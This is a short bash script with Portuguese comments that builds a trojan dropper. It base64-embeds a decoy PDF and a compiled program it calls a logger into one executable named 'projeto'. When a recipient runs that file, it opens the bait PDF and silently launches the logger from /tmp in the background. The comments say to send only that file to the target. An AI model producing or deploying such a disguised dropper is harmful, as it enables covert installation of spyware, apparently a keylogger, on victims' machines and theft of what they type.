#!/bin/bash

# Como usar:
# 1. Coloque este script na mesma pasta que:
#    - gato.pdf (arquivo bait)
#    - prog_test (logger compilado)
# 2. Execute: "make" no terminal
# 3. O arquivo "projeto" será gerado
# 4. Enviar apenas o arquivo "projeto"
# 5. Para testar, basta dar um "./projeto"
# ============================================

# Codifica os arquivos em base64
PDF_B64=$(base64 -w0 gato.pdf) # Codifica o arquivo bait
PROG_B64=$(base64 -w0 prog_test) # Codifica o logger


# Gera o conteúdo e arquivo final - Nome: projeto
cat > projeto.o << 'EOF'

#!/bin/bash

# Verifica se o logger ja esta em execucao

if pgrep -x "prog_test" > /dev/null; then
    # Abre o PDF (arquivo bait)
    xdg-open /tmp/trabalho.pdf 2>/dev/null &
    exit 0
fi   

PDF_B64="SUBSTITUIR_PDF"
PROG_B64="SUBSTITUIR_PROG"

# Decodifica os arquivos codificados
echo "$PDF_B64" | base64 -d > /tmp/trabalho.pdf
echo "$PROG_B64" | base64 -d > /tmp/prog_test

# Permite a execução do logger
chmod +x /tmp/prog_test

# Abre o pdf no executor padrão
xdg-open /tmp/trabalho.pdf 

# Executa o logger
/tmp/prog_test &

exit 0
EOF

# Substitui os placeholders pelos valores reais
sed -i "s|SUBSTITUIR_PDF|$PDF_B64|" projeto.o
sed -i "s|SUBSTITUIR_PROG|$PROG_B64|" projeto.o

# Dá permissão de execução
chmod +x projeto.o